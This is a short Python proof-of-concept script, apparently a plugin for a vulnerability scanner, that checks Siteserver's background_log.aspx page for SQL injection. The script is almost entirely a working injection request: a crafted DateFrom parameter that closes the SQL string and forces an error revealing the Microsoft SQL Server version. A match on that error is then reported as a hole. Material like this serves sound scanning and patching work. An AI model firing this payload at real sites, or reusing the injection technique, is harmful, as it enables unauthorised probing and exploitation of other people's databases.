#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Siteserver background_log.aspx SQL Injection
Reference :  http://www.wooyun.org/bugs/wooyun-2013-043523
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "siteserver":
        return True, arg
        
def audit(arg):
    payload = "/platform/background_log.aspx?UserName=test&Keyword=1&DateFrom=20120101%27%20and%20@@version=1%20and%201=%27test&DateTo=test"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    m = re.search("Microsoft SQL Server",res)
    if m:
        security_hole('Siteserver background_log.aspx SQL Injection exists.')

if __name__ == '__main__':
    from dummy import *
    audit(assign('siteserver', 'http://www.example.com/')[1])